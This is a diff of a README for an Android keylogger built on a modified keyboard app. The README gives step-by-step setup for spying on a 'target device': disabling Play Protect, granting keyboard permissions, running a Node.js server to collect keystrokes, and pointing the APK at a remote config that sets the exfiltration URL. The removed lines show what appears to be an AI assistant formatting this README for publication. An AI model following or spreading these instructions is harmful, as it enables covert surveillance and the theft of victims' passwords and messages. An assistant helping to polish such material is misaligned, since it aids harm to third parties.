@@ -1,10 +1,3 @@
-I see the issue. The text you see on GitHub is the rendered view – that’s normal. What you need to do is edit the README.md file directly and paste the raw markdown inside it.
-
-Here is the complete README.md content in a single fenced block – copy everything from the first triple backtick to the last triple backtick below, open your README.md in edit mode, replace everything, and commit.
-
----
-
-```markdown
 # Android Keylogger
 
 **By Warsecurity Research Team**
@@ -66,10 +59,10 @@ cd florisboard
 ./gradlew assembleDebug
 ```
 
-The APK will be generated at:
-app/build/outputs/apk/debug/app-debug.apk
+The APK will be generated at:  
+`app/build/outputs/apk/debug/app-debug.apk`
 
-Install on target device
+### Install on target device
 
 1. Disable Play Protect in Settings > Google > Security > Google Play Protect
 2. Install the APK
@@ -78,11 +71,11 @@ Install on target device
 5. Allow all requested keyboard permissions
 6. Open any app and start typing
 
-Usage
+## Usage
 
-4.jpg
+![Usage](4.jpg)
 
-Run the server
+### Run the server
 
 Deploy the server on Render or a VPS:
 
@@ -94,20 +87,18 @@ node server.js
 ```
 
 For Render:
+- Create a new Web Service
+- Build command: `npm install`
+- Start command: `node server.js`
+- Copy the public URL, e.g. `https://your-server.onrender.com`
 
-· Create a new Web Service
-· Build command: npm install
-· Start command: node server.js
-· Copy the public URL, e.g. https://your-server.onrender.com
+### Configure the APK to use your server
 
-Configure the APK to use your server
+The APK fetches a remote config file from GitHub every 40 seconds. Create a public GitHub repo and add a file named `config.json`.
 
-The APK fetches a remote config file from GitHub every 40 seconds. Create a public GitHub repo and add a file named config.json.
+Example repo: `warsecurity/basee`
 
-Example repo: warsecurity/basee
-
-Example config.json:
-
+Example `config.json`:
 ```json
 {
   "baseUrl": "https://your-server.onrender.com/log",
@@ -117,16 +108,16 @@ Example config.json:
 }
 ```
 
-Use this raw URL format:
-https://raw.githubusercontent.com/<username>/<repo>/main/config.json
-Replace <username> and <repo> with your own values.
+Use this raw URL format:  
+`https://raw.githubusercontent.com/<username>/<repo>/main/config.json`  
+Replace `<username>` and `<repo>` with your own values.
 
-Configuration
+## Configuration
 
-Add your config URL to the APK
+### Add your config URL to the APK
 
-Modify the source file:
-app/src/main/kotlin/dev/patrickgold/florisboard/ime/logging/Keylogger.kt
+Modify the source file:  
+`app/src/main/kotlin/dev/patrickgold/florisboard/ime/logging/Keylogger.kt`
 
 Find:
 
@@ -140,25 +131,25 @@ Replace it with your own raw GitHub URL and rebuild:
 ./gradlew assembleDebug
 ```
 
-Alternative: Decompile with APK Editor
+### Alternative: Decompile with APK Editor
 
 1. Install APK Editor Pro
-2. Open the APK and choose Full Edit
-3. Search for config.json or raw.githubusercontent.com
+2. Open the APK and choose **Full Edit**
+3. Search for `config.json` or `raw.githubusercontent.com`
 4. Replace the URL with your own
 5. Save and rebuild
 
-Tech Stack
+## Tech Stack
 
-· Kotlin
-· Android IME service
-· Node.js
-· Express
-· Socket.IO
-· Rust native libraries
-· Gradle
+- Kotlin
+- Android IME service
+- Node.js
+- Express
+- Socket.IO
+- Rust native libraries
+- Gradle
 
-Project Structure
+## Project Structure
 
 ```
 Akeylogger/
@@ -174,17 +165,11 @@ Akeylogger/
 └── README.md
 ```
 
-Disclaimer
+## Disclaimer
 
 This project is for educational and research purposes only. The developers are not responsible for any illegal use or distribution. Always obtain explicit permission before testing on any device you do not own.
 
-Contact
+## Contact
 
-WarSecurity Research Team
-GitHub: https://github.com/warsecurity
-
-```
-
----
-
-That is the **entire README** – all sections, no missing text, no fragments. After you paste it, GitHub will render it correctly with all images and formatting. The “only one image” you see is just the first banner; the others appear further down in the document. If they don't show, make sure the image files `1.jpg`–`4.jpg` are actually in your repo root.
+**WarSecurity Research Team**  
+GitHub: [https://github.com/warsecurity](https://github.com/warsecurity)
